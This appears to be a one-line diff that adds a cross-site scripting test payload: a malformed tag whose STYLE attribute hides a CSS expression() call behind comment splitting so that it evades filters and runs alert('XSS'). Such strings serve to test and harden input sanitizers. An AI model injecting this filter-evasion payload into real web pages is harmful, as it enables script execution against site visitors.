@@ -1,0 +1,1 @@
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> 
